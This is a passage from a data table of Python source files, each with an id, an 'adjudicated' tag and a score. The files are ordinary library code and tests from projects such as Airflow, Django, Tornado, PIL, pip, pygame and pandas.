files:<<NEWL>>                log.info(""Deleting %s"", f)<<NEWL>>                if not self.dry_run:<<NEWL>>                    if os.path.isdir(f):<<NEWL>>                        shutil.rmtree(f)<<NEWL>>                    else:<<NEWL>>                        os.unlink(f)"
78	adjudicated	2	"# Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>from typing import NamedTuple<<NEWL>><<NEWL>>from marshmallow import Schema, fields<<NEWL>>from marshmallow_sqlalchemy import SQLAlchemySchema, auto_field<<NEWL>><<NEWL>>from airflow.models.log import Log<<NEWL>><<NEWL>><<NEWL>>class EventLogSchema(SQLAlchemySchema):<<NEWL>>    """"""Event log schema.""""""<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        """"""Meta.""""""<<NEWL>><<NEWL>>        model = Log<<NEWL>><<NEWL>>    id = auto_field(data_key=""event_log_id"", dump_only=True)<<NEWL>>    dttm = auto_field(data_key=""when"", dump_only=True)<<NEWL>>    dag_id = auto_field(dump_only=True)<<NEWL>>    task_id = auto_field(dump_only=True)<<NEWL>>    event = auto_field(dump_only=True)<<NEWL>>    execution_date = auto_field(dump_only=True)<<NEWL>>    owner = auto_field(dump_only=True)<<NEWL>>    extra = auto_field(dump_only=True)<<NEWL>><<NEWL>><<NEWL>>class EventLogCollection(NamedTuple):<<NEWL>>    """"""List of import errors with metadata.""""""<<NEWL>><<NEWL>>    event_logs: list[Log]<<NEWL>>    total_entries: int<<NEWL>><<NEWL>><<NEWL>>class EventLogCollectionSchema(Schema):<<NEWL>>    """"""EventLog Collection Schema.""""""<<NEWL>><<NEWL>>    event_logs = fields.List(fields.Nested(EventLogSchema))<<NEWL>>    total_entries = fields.Int()<<NEWL>><<NEWL>><<NEWL>>event_log_schema = EventLogSchema()<<NEWL>>event_log_collection_schema = EventLogCollectionSchema()"
138	adjudicated	2	"import functools<<NEWL>>from pathlib import Path<<NEWL>><<NEWL>>from django.conf import settings<<NEWL>>from django.template.backends.django import DjangoTemplates<<NEWL>>from django.template.loader import get_template<<NEWL>>from django.utils.functional import cached_property<<NEWL>>from django.utils.module_loading import import_string<<NEWL>><<NEWL>>try:<<NEWL>>    from django.template.backends.jinja2 import Jinja2<<NEWL>>except ImportError:<<NEWL>>    def Jinja2(params):<<NEWL>>        raise ImportError(""jinja2 isn't installed"")<<NEWL>><<NEWL>>ROOT = Path(__file__).parent<<NEWL>><<NEWL>><<NEWL>>@functools.lru_cache()<<NEWL>>def get_default_renderer():<<NEWL>>    renderer_class = import_string(settings.FORM_RENDERER)<<NEWL>>    return renderer_class()<<NEWL>><<NEWL>><<NEWL>>class BaseRenderer:<<NEWL>>    def get_template(self, template_name):<<NEWL>>        raise NotImplementedError('subclasses must implement get_template()')<<NEWL>><<NEWL>>    def render(self, template_name, context, request=None):<<NEWL>>        template = self.get_template(template_name)<<NEWL>>        return template.render(context, request=request).strip()<<NEWL>><<NEWL>><<NEWL>>class EngineMixin:<<NEWL>>    def get_template(self, template_name):<<NEWL>>        return self.engine.get_template(template_name)<<NEWL>><<NEWL>>    @cached_property<<NEWL>>    def engine(self):<<NEWL>>        return self.backend({<<NEWL>>            'APP_DIRS': True,<<NEWL>>            'DIRS': [ROOT / self.backend.app_dirname],<<NEWL>>            'NAME': 'djangoforms',<<NEWL>>            'OPTIONS': {},<<NEWL>>        })<<NEWL>><<NEWL>><<NEWL>>class DjangoTemplates(EngineMixin, BaseRenderer):<<NEWL>>    """"""<<NEWL>>    Load Django templates from the built-in widget templates in<<NEWL>>    django/forms/templates and from apps' 'templates' directory.<<NEWL>>    """"""<<NEWL>>    backend = DjangoTemplates<<NEWL>><<NEWL>><<NEWL>>class Jinja2(EngineMixin, BaseRenderer):<<NEWL>>    """"""<<NEWL>>    Load Jinja2 templates from the built-in widget templates in<<NEWL>>    django/forms/jinja2 and from apps' 'jinja2' directory.<<NEWL>>    """"""<<NEWL>>    backend = Jinja2<<NEWL>><<NEWL>><<NEWL>>class TemplatesSetting(BaseRenderer):<<NEWL>>    """"""<<NEWL>>    Load templates using template.loader.get_template() which is configured<<NEWL>>    based on settings.TEMPLATES.<<NEWL>>    """"""<<NEWL>>    def get_template(self, template_name):<<NEWL>>        return get_template(template_name)"
29	adjudicated	1	"import socket<<NEWL>>import typing<<NEWL>><<NEWL>>from tornado.http1connection import HTTP1Connection<<NEWL>>from tornado.httputil import HTTPMessageDelegate<<NEWL>>from tornado.iostream import IOStream<<NEWL>>from tornado.locks import Event<<NEWL>>from tornado.netutil import add_accept_handler<<NEWL>>from tornado.testing import AsyncTestCase, bind_unused_port, gen_test<<NEWL>><<NEWL>><<NEWL>>class HTTP1ConnectionTest(AsyncTestCase):<<NEWL>>    code = None  # type: typing.Optional[int]<<NEWL>><<NEWL>>    def setUp(self):<<NEWL>>        super().setUp()<<NEWL>>        self.asyncSetUp()<<NEWL>><<NEWL>>    @gen_test<<NEWL>>    def asyncSetUp(self):<<NEWL>>        listener, port = bind_unused_port()<<NEWL>>        event = Event()<<NEWL>><<NEWL>>        def accept_callback(conn, addr):<<NEWL>>            self.server_stream = IOStream(conn)<<NEWL>>            self.addCleanup(self.server_stream.close)<<NEWL>>            event.set()<<NEWL>><<NEWL>>        add_accept_handler(listener, accept_callback)<<NEWL>>        self.client_stream = IOStream(socket.socket())<<NEWL>>        self.addCleanup(self.client_stream.close)<<NEWL>>        yield [self.client_stream.connect((""127.0.0.1"", port)), event.wait()]<<NEWL>>        self.io_loop.remove_handler(listener)<<NEWL>>        listener.close()<<NEWL>><<NEWL>>    @gen_test<<NEWL>>    def test_http10_no_content_length(self):<<NEWL>>        # Regression test for a bug in which can_keep_alive would crash<<NEWL>>        # for an HTTP/1.0 (not 1.1) response with no content-length.<<NEWL>>        conn = HTTP1Connection(self.client_stream, True)<<NEWL>>        self.server_stream.write(b""HTTP/1.0 200 Not Modified\r\n\r\nhello"")<<NEWL>>        self.server_stream.close()<<NEWL>><<NEWL>>        event = Event()<<NEWL>>        test = self<<NEWL>>        body = []<<NEWL>><<NEWL>>        class Delegate(HTTPMessageDelegate):<<NEWL>>            def headers_received(self, start_line, headers):<<NEWL>>                test.code = start_line.code<<NEWL>><<NEWL>>            def data_received(self, data):<<NEWL>>                body.append(data)<<NEWL>><<NEWL>>            def finish(self):<<NEWL>>                event.set()<<NEWL>><<NEWL>>        yield conn.read_response(Delegate())<<NEWL>>        yield event.wait()<<NEWL>>        self.assertEqual(self.code, 200)<<NEWL>>        self.assertEqual(b"""".join(body), b""hello"")"
169	adjudicated	3	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># Binary input/output support routines.<<NEWL>>#<<NEWL>># Copyright (c) 1997-2003 by Secret Labs AB<<NEWL>># Copyright (c) 1995-2003 by Fredrik Lundh<<NEWL>># Copyright (c) 2012 by Brian Crowell<<NEWL>>#<<NEWL>># See the README file for information on usage and redistribution.<<NEWL>>#<<NEWL>><<NEWL>><<NEWL>>""""""Binary input/output support routines.""""""<<NEWL>><<NEWL>><<NEWL>>from struct import pack, unpack_from<<NEWL>><<NEWL>><<NEWL>>def i8(c):<<NEWL>>    return c if c.__class__ is int else c[0]<<NEWL>><<NEWL>><<NEWL>>def o8(i):<<NEWL>>    return bytes((i & 255,))<<NEWL>><<NEWL>><<NEWL>># Input, le = little endian, be = big endian<<NEWL>>def i16le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to an unsigned integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<H"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si16le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to a signed integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<h"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si16be(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to a signed integer, big endian.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from("">h"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i32le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 4-bytes (32 bits) string to an unsigned integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<I"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si32le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 4-bytes (32 bits) string to a signed integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<i"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i16be(c, o=0):<<NEWL>>    return unpack_from("">H"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i32be(c, o=0):<<NEWL>>    return unpack_from("">I"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>># Output, le = little endian, be = big endian<<NEWL>>def o16le(i):<<NEWL>>    return pack(""<H"", i)<<NEWL>><<NEWL>><<NEWL>>def o32le(i):<<NEWL>>    return pack(""<I"", i)<<NEWL>><<NEWL>><<NEWL>>def o16be(i):<<NEWL>>    return pack("">H"", i)<<NEWL>><<NEWL>><<NEWL>>def o32be(i):<<NEWL>>    return pack("">I"", i)"
454	adjudicated	1	"""""""<<NEWL>>views.py        # Houses `SchemaView`, `APIView` subclass.<<NEWL>><<NEWL>>See schemas.__init__.py for package overview.<<NEWL>>""""""<<NEWL>>from rest_framework import exceptions, renderers<<NEWL>>from rest_framework.response import Response<<NEWL>>from rest_framework.schemas import coreapi<<NEWL>>from rest_framework.settings import api_settings<<NEWL>>from rest_framework.views import APIView<<NEWL>><<NEWL>><<NEWL>>class SchemaView(APIView):<<NEWL>>    _ignore_model_permissions = True<<NEWL>>    schema = None  # exclude from schema<<NEWL>>    renderer_classes = None<<NEWL>>    schema_generator = None<<NEWL>>    public = False<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>>        if self.renderer_classes is None:<<NEWL>>            if coreapi.is_enabled():<<NEWL>>                self.renderer_classes = [<<NEWL>>                    renderers.CoreAPIOpenAPIRenderer,<<NEWL>>                    renderers.CoreJSONRenderer<<NEWL>>                ]<<NEWL>>            else:<<NEWL>>                self.renderer_classes = [<<NEWL>>                    renderers.OpenAPIRenderer,<<NEWL>>                    renderers.JSONOpenAPIRenderer,<<NEWL>>                ]<<NEWL>>            if renderers.BrowsableAPIRenderer in api_settings.DEFAULT_RENDERER_CLASSES:<<NEWL>>                self.renderer_classes += [renderers.BrowsableAPIRenderer]<<NEWL>><<NEWL>>    def get(self, request, *args, **kwargs):<<NEWL>>        schema = self.schema_generator.get_schema(request, self.public)<<NEWL>>        if schema is None:<<NEWL>>            raise exceptions.PermissionDenied()<<NEWL>>        return Response(schema)<<NEWL>><<NEWL>>    def handle_exception(self, exc):<<NEWL>>        # Schema renderers do not render exceptions, so re-perform content<<NEWL>>        # negotiation with default renderers.<<NEWL>>        self.renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES<<NEWL>>        neg = self.perform_content_negotiation(self.request, force=True)<<NEWL>>        self.request.accepted_renderer, self.request.accepted_media_type = neg<<NEWL>>        return super().handle_exception(exc)"
514	adjudicated	3	"""""""<<NEWL>> The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class SpatialiteGeometryColumns(models.Model):<<NEWL>>    """"""<<NEWL>>    The 'geometry_columns' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>>    f_table_name = models.CharField(max_length=256)<<NEWL>>    f_geometry_column = models.CharField(max_length=256)<<NEWL>>    coord_dimension = models.IntegerField()<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    spatial_index_enabled = models.IntegerField()<<NEWL>>    type = models.IntegerField(db_column='geometry_type')<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = 'gis'<<NEWL>>        db_table = 'geometry_columns'<<NEWL>>        managed = False<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return '%s.%s - %dD %s field (SRID: %d)' % (<<NEWL>>            self.f_table_name,<<NEWL>>            self.f_geometry_column,<<NEWL>>            self.coord_dimension,<<NEWL>>            self.type,<<NEWL>>            self.srid,<<NEWL>>        )<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def table_name_col(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature table<<NEWL>>        name.<<NEWL>>        """"""<<NEWL>>        return 'f_table_name'<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def geom_col_name(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature<<NEWL>>        geometry column.<<NEWL>>        """"""<<NEWL>>        return 'f_geometry_column'<<NEWL>><<NEWL>><<NEWL>>class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):<<NEWL>>    """"""<<NEWL>>    The 'spatial_ref_sys' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    auth_name = models.CharField(max_length=256)<<NEWL>>    auth_srid = models.IntegerField()<<NEWL>>    ref_sys_name = models.CharField(max_length=256)<<NEWL>>    proj4text = models.CharField(max_length=2048)<<NEWL>>    srtext = models.CharField(max_length=2048)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = 'gis'<<NEWL>>        db_table = 'spatial_ref_sys'<<NEWL>>        managed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def wkt(self):<<NEWL>>        return self.srtext"
405	adjudicated	4	"from itertools import filterfalse<<NEWL>><<NEWL>><<NEWL>>def unique_everseen(iterable, key=None):<<NEWL>>    ""List unique elements, preserving order. Remember all elements ever seen.""<<NEWL>>    # unique_everseen('AAAABBBCCDAABBB') --> A B C D<<NEWL>>    # unique_everseen('ABBCcAD', str.lower) --> A B C D<<NEWL>>    seen = set()<<NEWL>>    seen_add = seen.add<<NEWL>>    if key is None:<<NEWL>>        for element in filterfalse(seen.__contains__, iterable):<<NEWL>>            seen_add(element)<<NEWL>>            yield element<<NEWL>>    else:<<NEWL>>        for element in iterable:<<NEWL>>            k = key(element)<<NEWL>>            if k not in seen:<<NEWL>>                seen_add(k)<<NEWL>>                yield element<<NEWL>><<NEWL>><<NEWL>># copied from more_itertools 8.8<<NEWL>>def always_iterable(obj, base_type=(str, bytes)):<<NEWL>>    """"""If *obj* is iterable, return an iterator over its items::<<NEWL>><<NEWL>>        >>> obj = (1, 2, 3)<<NEWL>>        >>> list(always_iterable(obj))<<NEWL>>        [1, 2, 3]<<NEWL>><<NEWL>>    If *obj* is not iterable, return a one-item iterable containing *obj*::<<NEWL>><<NEWL>>        >>> obj = 1<<NEWL>>        >>> list(always_iterable(obj))<<NEWL>>        [1]<<NEWL>><<NEWL>>    If *obj* is ``None``, return an empty iterable:<<NEWL>><<NEWL>>        >>> obj = None<<NEWL>>        >>> list(always_iterable(None))<<NEWL>>        []<<NEWL>><<NEWL>>    By default, binary and text strings are not considered iterable::<<NEWL>><<NEWL>>        >>> obj = 'foo'<<NEWL>>        >>> list(always_iterable(obj))<<NEWL>>        ['foo']<<NEWL>><<NEWL>>    If *base_type* is set, objects for which ``isinstance(obj, base_type)``<<NEWL>>    returns ``True`` won't be considered iterable.<<NEWL>><<NEWL>>        >>> obj = {'a': 1}<<NEWL>>        >>> list(always_iterable(obj))  # Iterate over the dict's keys<<NEWL>>        ['a']<<NEWL>>        >>> list(always_iterable(obj, base_type=dict))  # Treat dicts as a unit<<NEWL>>        [{'a': 1}]<<NEWL>><<NEWL>>    Set *base_type* to ``None`` to avoid any special handling and treat objects<<NEWL>>    Python considers iterable as iterable:<<NEWL>><<NEWL>>        >>> obj = 'foo'<<NEWL>>        >>> list(always_iterable(obj, base_type=None))<<NEWL>>        ['f', 'o', 'o']<<NEWL>>    """"""<<NEWL>>    if obj is None:<<NEWL>>        return iter(())<<NEWL>><<NEWL>>    if (base_type is not None) and isinstance(obj, base_type):<<NEWL>>        return iter((obj,))<<NEWL>><<NEWL>>    try:<<NEWL>>        return iter(obj)<<NEWL>>    except TypeError:<<NEWL>>        return iter((obj,))"
493	adjudicated	2	"#<<NEWL>># Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>from unittest import mock<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from airflow.cli import cli_parser<<NEWL>>from airflow.cli.commands import dag_processor_command<<NEWL>>from airflow.configuration import conf<<NEWL>>from tests.test_utils.config import conf_vars<<NEWL>><<NEWL>><<NEWL>>class TestDagProcessorCommand:<<NEWL>>    """"""<<NEWL>>    Tests the CLI interface and that it correctly calls the DagProcessor<<NEWL>>    """"""<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def setup_class(cls):<<NEWL>>        cls.parser = cli_parser.get_parser()<<NEWL>><<NEWL>>    @conf_vars(<<NEWL>>        {<<NEWL>>            (""scheduler"", ""standalone_dag_processor""): ""True"",<<NEWL>>            (""core"", ""load_examples""): ""False"",<<NEWL>>        }<<NEWL>>    )<<NEWL>>    @mock.patch(""airflow.cli.commands.dag_processor_command.DagProcessorJob"")<<NEWL>>    @pytest.mark.skipif(<<NEWL>>        conf.get_mandatory_value(""database"", ""sql_alchemy_conn"").lower().startswith(""sqlite""),<<NEWL>>        reason=""Standalone Dag Processor doesn't support sqlite."",<<NEWL>>    )<<NEWL>>    def test_start_job(<<NEWL>>        self,<<NEWL>>        mock_dag_job,<<NEWL>>    ):<<NEWL>>        """"""Ensure that DagFileProcessorManager is started""""""<<NEWL>>        with conf_vars({(""scheduler"", ""standalone_dag_processor""): ""True""}):<<NEWL>>            args = self.parser.parse_args([""dag-processor""])<<NEWL>>            dag_processor_command.dag_processor(args)<<NEWL>>            mock_dag_job.return_value.run.assert_called()"
431	adjudicated	3	"import os<<NEWL>>import string<<NEWL>>import urllib.parse<<NEWL>>import urllib.request<<NEWL>>from typing import Optional<<NEWL>><<NEWL>>from .compat import WINDOWS<<NEWL>><<NEWL>><<NEWL>>def get_url_scheme(url: str) -> Optional[str]:<<NEWL>>    if "":"" not in url:<<NEWL>>        return None<<NEWL>>    return url.split("":"", 1)[0].lower()<<NEWL>><<NEWL>><<NEWL>>def path_to_url(path: str) -> str:<<NEWL>>    """"""<<NEWL>>    Convert a path to a file: URL.  The path will be made absolute and have<<NEWL>>    quoted path parts.<<NEWL>>    """"""<<NEWL>>    path = os.path.normpath(os.path.abspath(path))<<NEWL>>    url = urllib.parse.urljoin(""file:"", urllib.request.pathname2url(path))<<NEWL>>    return url<<NEWL>><<NEWL>><<NEWL>>def url_to_path(url: str) -> str:<<NEWL>>    """"""<<NEWL>>    Convert a file: URL to a path.<<NEWL>>    """"""<<NEWL>>    assert url.startswith(<<NEWL>>        ""file:""<<NEWL>>    ), f""You can only turn file: urls into filenames (not {url!r})""<<NEWL>><<NEWL>>    _, netloc, path, _, _ = urllib.parse.urlsplit(url)<<NEWL>><<NEWL>>    if not netloc or netloc == ""localhost"":<<NEWL>>        # According to RFC 8089, same as empty authority.<<NEWL>>        netloc = """"<<NEWL>>    elif WINDOWS:<<NEWL>>        # If we have a UNC path, prepend UNC share notation.<<NEWL>>        netloc = ""\\\\"" + netloc<<NEWL>>    else:<<NEWL>>        raise ValueError(<<NEWL>>            f""non-local file URIs are not supported on this platform: {url!r}""<<NEWL>>        )<<NEWL>><<NEWL>>    path = urllib.request.url2pathname(netloc + path)<<NEWL>><<NEWL>>    # On Windows, urlsplit parses the path as something like ""/C:/Users/foo"".<<NEWL>>    # This creates issues for path-related functions like io.open(), so we try<<NEWL>>    # to detect and strip the leading slash.<<NEWL>>    if (<<NEWL>>        WINDOWS<<NEWL>>        and not netloc  # Not UNC.<<NEWL>>        and len(path) >= 3<<NEWL>>        and path[0] == ""/""  # Leading slash to strip.<<NEWL>>        and path[1] in string.ascii_letters  # Drive letter.<<NEWL>>        and path[2:4] in ("":"", "":/"")  # Colon + end of string, or colon + absolute path.<<NEWL>>    ):<<NEWL>>        path = path[1:]<<NEWL>><<NEWL>>    return path"
460	adjudicated	1	"#!/usr/bin/env python<<NEWL>>"""""" pygame.examples.setmodescale<<NEWL>><<NEWL>>On high resolution displays(4k, 1080p) and tiny graphics games (640x480)<<NEWL>>show up very small so that they are unplayable. SCALED scales up the window<<NEWL>>for you. The game thinks it's a 640x480 window, but really it can be bigger.<<NEWL>>Mouse events are scaled for you, so your game doesn't need to do it.<<NEWL>><<NEWL>>Passing SCALED to pygame.display.set_mode means the resolution depends<<NEWL>>on desktop size and the graphics are scaled.<<NEWL>>""""""<<NEWL>><<NEWL>>import pygame as pg<<NEWL>><<NEWL>>pg.init()<<NEWL>><<NEWL>>RES = (160, 120)<<NEWL>>FPS = 30<<NEWL>>clock = pg.time.Clock()<<NEWL>><<NEWL>>print(""desktops"", pg.display.get_desktop_sizes())<<NEWL>>screen = pg.display.set_mode(RES, pg.SCALED | pg.RESIZABLE)<<NEWL>><<NEWL>># MAIN LOOP<<NEWL>><<NEWL>>done = False<<NEWL>><<NEWL>>i = 0<<NEWL>>j = 0<<NEWL>><<NEWL>>r_name, r_flags = pg.display._get_renderer_info()<<NEWL>>print(""renderer:"", r_name, ""flags:"", bin(r_flags))<<NEWL>>for flag, name in [<<NEWL>>    (1, ""software""),<<NEWL>>    (2, ""accelerated""),<<NEWL>>    (4, ""VSync""),<<NEWL>>    (8, ""render to texture""),<<NEWL>>]:<<NEWL>>    if flag & r_flags:<<NEWL>>        print(name)<<NEWL>><<NEWL>>while not done:<<NEWL>>    for event in pg.event.get():<<NEWL>>        if event.type == pg.KEYDOWN and event.key == pg.K_q:<<NEWL>>            done = True<<NEWL>>        if event.type == pg.QUIT:<<NEWL>>            done = True<<NEWL>>        if event.type == pg.KEYDOWN and event.key == pg.K_f:<<NEWL>>            pg.display.toggle_fullscreen()<<NEWL>>        if event.type == pg.VIDEORESIZE:<<NEWL>>            pg.display._resize_event(event)<<NEWL>><<NEWL>>    i += 1<<NEWL>>    i = i % screen.get_width()<<NEWL>>    j += i % 2<<NEWL>>    j = j % screen.get_height()<<NEWL>><<NEWL>>    screen.fill((255, 0, 255))<<NEWL>>    pg.draw.circle(screen, (0, 0, 0), (100, 100), 20)<<NEWL>>    pg.draw.circle(screen, (0, 0, 200), (0, 0), 10)<<NEWL>>    pg.draw.circle(screen, (200, 0, 0), (160, 120), 30)<<NEWL>>    pg.draw.line(screen, (250, 250, 0), (0, 120), (160, 0))<<NEWL>>    pg.draw.circle(screen, (255, 255, 255), (i, j), 5)<<NEWL>><<NEWL>>    pg.display.flip()<<NEWL>>    clock.tick(FPS)<<NEWL>>pg.quit()"
412	adjudicated	2	"import numpy as np<<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>from pandas import (<<NEWL>>    Index,<<NEWL>>    MultiIndex,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>># Note: identical the ""multi"" entry in the top-level ""index"" fixture<<NEWL>>@pytest.fixture<<NEWL>>def idx():<<NEWL>>    # a MultiIndex used to test the general functionality of the<<NEWL>>    # general functionality of this object<<NEWL>>    major_axis = Index([""foo"", ""bar"", ""baz"", ""qux""])<<NEWL>>    minor_axis = Index([""one"", ""two""])<<NEWL>><<NEWL>>    major_codes = np.array([0, 0, 1, 2, 3, 3])<<NEWL>>    minor_codes = np.array([0, 1, 0, 1, 0, 1])<<NEWL>>    index_names = [""first"", ""second""]<<NEWL>>    mi = MultiIndex(<<NEWL>>        levels=[major_axis, minor_axis],<<NEWL>>        codes=[major_codes, minor_codes],<<NEWL>>        names=index_names,<<NEWL>>        verify_integrity=False,<<NEWL>>    )<<NEWL>>    return mi<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def idx_dup():<<NEWL>>    # compare tests/indexes/multi/conftest.py<<NEWL>>    major_axis = Index([""foo"", ""bar"", ""baz"", ""qux""])<<NEWL>>    minor_axis = Index([""one"", ""two""])<<NEWL>><<NEWL>>    major_codes = np.array([0, 0, 1, 0, 1, 1])<<NEWL>>    minor_codes = np.array([0, 1, 0, 1, 0, 1])<<NEWL>>    index_names = [""first"", ""second""]<<NEWL>>    mi = MultiIndex(<<NEWL>>        levels=[major_axis, minor_axis],<<NEWL>>        codes=[major_codes, minor_codes],<<NEWL>>        names=index_names,<<NEWL>>        verify_integrity=False,<<NEWL>>    )<<NEWL>>    return mi<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def index_names():<<NEWL>>    # names that match those in the idx fixture for testing equality of<<NEWL>>    # names assigned to the idx<<NEWL>>    return [""first"", ""second""]<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def narrow_multi_index():<<NEWL>>    """"""<<NEWL>>    Return a MultiIndex that is narrower than the display (<80 characters).<<NEWL>>    """"""<<NEWL>>    n = 1000<<NEWL>>    ci = pd.CategoricalIndex(list(""a"" * n) + ([""abc""] * n))<<NEWL>>    dti = pd.date_range(""2000-01-01"", freq=""s"", periods=n * 2)<<NEWL>>    return MultiIndex.from_arrays([ci, ci.codes + 9, dti], names=[""a"", ""b"", ""dti""])<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def wide_multi_index():<<NEWL>>    """"""<<NEWL>>    Return a MultiIndex that is wider than the display (>80 characters).<<NEWL>>    """"""<<NEWL>>    n = 1000<<NEWL>>    ci = pd.CategoricalIndex(list(""a"" * n) + ([""abc""] * n))<<NEWL>>    dti = pd.date_range(""2000-01-01"", freq=""s"", periods=n * 2)<<NEWL>>    levels = [ci, ci.codes + 9, dti, dti, dti]<<NEWL>>    names = [""a"", ""b"", ""dti_1"", ""dti_2"", ""dti_3""]<<NEWL>>    return MultiIndex.from_arrays(levels, names=names)"
503	adjudicated	1	"import unittest<<NEWL>><<NEWL>>from nbformat import v4 as nbformat<<NEWL>><<NEWL>><<NEWL>>class NBClientTestsBase(unittest.TestCase):<<NEWL>>    def build_notebook(self, with_json_outputs=False):<<NEWL>>        """"""Build a notebook in memory for use with NotebookClient tests""""""<<NEWL>><<NEWL>>        outputs = [<<NEWL>>            nbformat.new_output(""stream"", name=""stdout"", text=""a""),<<NEWL>>            nbformat.new_output(""display_data"", data={'text/plain': 'b'}),<<NEWL>>            nbformat.new_output(""stream"", name=""stdout"", text=""c""),<<NEWL>>            nbformat.new_output(""stream"", name=""stdout"", text=""d""),<<NEWL>>            nbformat.new_output(""stream"", name=""stderr"", text=""e""),<<NEWL>>            nbformat.new_output(""stream"", name=""stderr"", text=""f""),<<NEWL>>            nbformat.new_output(""display_data"", data={'image/png': 'Zw=='}),  # g<<NEWL>>            nbformat.new_output(""display_data"", data={'application/pdf': 'aA=='}),  # h<<NEWL>>        ]<<NEWL>>        if with_json_outputs:<<NEWL>>            outputs.extend(<<NEWL>>                [<<NEWL>>                    nbformat.new_output(""display_data"", data={'application/json': [1, 2, 3]}),  # j<<NEWL>>                    nbformat.new_output(<<NEWL>>                        ""display_data"", data={'application/json': {'a': 1, 'c': {'b': 2}}}<<NEWL>>                    ),  # k<<NEWL>>                    nbformat.new_output(""display_data"", data={'application/json': 'abc'}),  # l<<NEWL>>                    nbformat.new_output(""display_data"", data={'application/json': 15.03}),  # m<<NEWL>>                ]<<NEWL>>            )<<NEWL>><<NEWL>>        cells = [<<NEWL>>            nbformat.new_code_cell(source=""$ e $"", execution_count=1, outputs=outputs),<<NEWL>>            nbformat.new_markdown_cell(source=""$ e $""),<<NEWL>>        ]<<NEWL>><<NEWL>>        return nbformat.new_notebook(cells=cells)<<NEWL>><<NEWL>>    def build_resources(self):<<NEWL>>        """"""Build an empty resources dictionary.""""""<<NEWL>>        return {'metadata': {}}<<NEWL>><<NEWL>>  